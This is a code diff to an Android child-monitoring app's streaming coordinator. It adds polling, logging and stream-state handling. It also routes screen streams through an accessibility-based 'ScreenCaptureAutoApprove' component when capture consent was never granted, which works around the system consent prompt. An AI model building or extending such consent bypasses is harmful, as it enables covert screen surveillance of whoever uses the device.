@@ -11,7 +11,9 @@ import com.childmonitor.MonitoringPrefs
 import com.childmonitor.NativeSyncUploader
 import com.childmonitor.PolicySyncManager
 import com.childmonitor.debug.PcpFlowLogger
+import com.childmonitor.debug.StreamState
 import com.childmonitor.StreamingHeadlessTaskService
+import com.childmonitor.accessibility.ScreenCaptureAutoApprove
 import com.childmonitor.capture.AudioStreamForegroundService
 import com.childmonitor.capture.CameraStreamForegroundService
 import com.childmonitor.capture.MediaProjectionConsentState
@@ -45,6 +47,8 @@ object NativeStreamingCoordinator {
 
     private const val TAG = "NativeStreamingCoord"
     private const val POLL_MS = 3000L
+    /** HTTP fallback when FGS burst ended but STOMP may drop under Doze. */
+    private const val SLOW_POLL_MS = 30_000L
 
     private val running = AtomicBoolean(false)
     private val jsListenerActive = AtomicBoolean(false)
@@ -83,6 +87,9 @@ object NativeStreamingCoordinator {
         }
         if (!running.compareAndSet(false, true)) {
             NativeStompOwner.ensureConnected(context.applicationContext)
+            if (pollRunnable == null) {
+                startPollLoop()
+            }
             return
         }
         appContext = context.applicationContext
@@ -99,6 +106,21 @@ object NativeStreamingCoordinator {
             return
         }
         NativeStompOwner.ensureConnected(context.applicationContext)
+    }
+
+    /**
+     * After a monitoring FGS burst ends: stop the HTTP poll loop but keep STOMP connected so
+     * stream requests and commands arrive without waiting for the next WorkManager cycle.
+     */
+    fun pauseAfterBurst(context: Context) {
+        if (!running.get()) return
+        appContext = context.applicationContext
+        mainHandler.removeCallbacksAndMessages(null)
+        pollRunnable?.let { mainHandler.removeCallbacks(it) }
+        pollRunnable = null
+        NativeStompOwner.ensureConnected(context.applicationContext)
+        startPollLoop(SLOW_POLL_MS)
+        Log.i(TAG, "Paused fast poll after burst — STOMP + slow HTTP poll (${SLOW_POLL_MS}ms)")
     }
 
     fun stop(context: Context) {
@@ -257,6 +279,15 @@ object NativeStreamingCoordinator {
     private fun handleStompMessage(context: Context, destination: String, body: String) {
         try {
             val json = JSONObject(body)
+            json.optString("traceId").takeIf { it.isNotBlank() }?.let {
+                PcpFlowLogger.setTraceId(it)
+            }
+            PcpFlowLogger.log(
+                PcpFlowLogger.Category.SOCKET_SIGNALING,
+                "handleStompMessage",
+                "STOMP message received",
+                "destination=$destination bodyLen=${body.length}",
+            )
             when {
                 destination.contains("/commands") -> onDeviceCommand(
                     context,
@@ -285,6 +316,7 @@ object NativeStreamingCoordinator {
                 }.start()
             }
         } catch (e: Exception) {
+            PcpFlowLogger.error(PcpFlowLogger.Category.SOCKET_SIGNALING, "handleStompMessage", "Failed to parse STOMP body", e)
             Log.e(TAG, "Failed to parse STOMP body destination=$destination", e)
         }
     }
@@ -338,6 +370,8 @@ object NativeStreamingCoordinator {
         sessionId: String,
         cameraFacing: String?,
     ) {
+        PcpFlowLogger.transitionState(StreamState.REQUEST_RECEIVED, "onStreamRequestWorkerLocked",
+            "type=$streamType room=$roomId session=$sessionId")
         PcpFlowLogger.log(
             PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
             "child stream request received (native coordinator)",
@@ -417,16 +451,42 @@ object NativeStreamingCoordinator {
                         return
                     }
                     MediaProjectionConsentState.RECOVERY_PENDING -> {
-                        reportStreamFailure(context, sessionId, "PROJECTION_RECOVERY_PENDING")
-                        PcpFlowLogger.warn(
+                        PcpFlowLogger.log(
                             PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
-                            "screen stream deferred — recovery in progress",
+                            "screen stream — recovery pending, waiting",
                             "session=$sessionId",
                         )
-                        return
+                        val recovered = MediaProjectionRecoveryManager.attemptRecoveryAsync(
+                            context,
+                            "stream_recovery_pending",
+                            30_000L,
+                        )
+                        if (!recovered) {
+                            reportStreamFailure(context, sessionId, "PROJECTION_RECOVERY_PENDING")
+                            PcpFlowLogger.warn(
+                                PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
+                                "screen stream deferred — recovery timed out",
+                                "session=$sessionId",
+                            )
+                            return
+                        }
                     }
                     MediaProjectionConsentState.NEVER_GRANTED -> {
-                        MediaProjectionRecoveryManager.attemptRecovery(context, "no_consent")
+                        if (ScreenCaptureAutoApprove.isReady(context)) {
+                            val recovered = MediaProjectionRecoveryManager.attemptRecoveryAsync(
+                                context,
+                                "stream_no_consent",
+                            )
+                            if (!recovered) {
+                                reportStreamFailure(context, sessionId, "NO_SCREEN_CAPTURE_CONSENT")
+                                PcpFlowLogger.warn(
+                                    PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
+                                    "screen stream aborted — auto consent failed",
+                                    "session=$sessionId",
+                                )
+                            }
+                            return
+                        }
                         reportStreamFailure(context, sessionId, "NO_SCREEN_CAPTURE_CONSENT")
                         PcpFlowLogger.warn(
                             PcpFlowLogger.Category.SCREEN_SHARE_FLOW,
@@ -435,7 +495,7 @@ object NativeStreamingCoordinator {
                         )
                         Log.e(
                             TAG,
-                            "Screen stream aborted — grant screen capture once during child pairing",
+                            "Screen stream aborted — enable Accessibility then retry screen share",
                         )
                         return
                     }
@@ -476,7 +536,11 @@ object NativeStreamingCoordinator {
             }
 
             if (kind != null && !StreamFgsHelper.isActive(kind)) {
+                PcpFlowLogger.transitionState(StreamState.SERVICE_STARTING, "onStreamRequestWorkerLocked",
+                    "kind=$kind session=$sessionId")
                 if (StreamFgsPreparer.ensureKindReady(context, kind)) {
+                    PcpFlowLogger.transitionState(StreamState.SERVICE_STARTED, "onStreamRequestWorkerLocked",
+                        "kind=$kind session=$sessionId")
                     // FGS pre-warmed — fall through to stream start below.
                 } else {
                     activeRoomId = roomId
@@ -566,8 +630,11 @@ object NativeStreamingCoordinator {
                 "reactActive=${ChildMonitorNativeModule.canDeliverStreamToJs()}",
         )
         if (sessionId.isNotBlank() && activeSessionId != null && activeSessionId != sessionId) {
-            Log.w(TAG, "stream-stop ignored — session mismatch want=$sessionId have=$activeSessionId")
-            return
+            if (roomId.isBlank() || activeRoomId == null || activeRoomId != roomId) {
+                Log.w(TAG, "stream-stop ignored — session mismatch want=$sessionId have=$activeSessionId")
+                return
+            }
+            Log.w(TAG, "stream-stop session mismatch but room matches — stopping room=$roomId")
         }
         if (roomId.isNotBlank() && activeRoomId != null && activeRoomId != roomId) {
             Log.w(TAG, "stream-stop ignored — room mismatch want=$roomId have=$activeRoomId")
@@ -598,7 +665,7 @@ object NativeStreamingCoordinator {
         StreamCaptureTeardown.stopAll(context, reason)
     }
 
-    private fun startPollLoop() {
+    private fun startPollLoop(intervalMs: Long = POLL_MS) {
         pollRunnable?.let { mainHandler.removeCallbacks(it) }
         pollRunnable = object : Runnable {
             override fun run() {
@@ -607,7 +674,7 @@ object NativeStreamingCoordinator {
                     Thread { pollSessions(ctx) }.start()
                 }
                 if (running.get()) {
-                    mainHandler.postDelayed(this, POLL_MS)
+                    mainHandler.postDelayed(this, intervalMs)
                 }
             }
         }
@@ -646,6 +713,9 @@ object NativeStreamingCoordinator {
             val activeRoot = JSONObject(activeJson)
             if (activeRoot.isNull("data")) {
                 if (activeSessionId != null || nativeScreenActive || NativeStreamPublisher.isRunning()) {
+                    if (StreamSessionRegistry.isNegotiatingOrReconnecting()) {
+                        return
+                    }
                     stopAllStreams(context, "no active session (poll)")
                 }
                 return
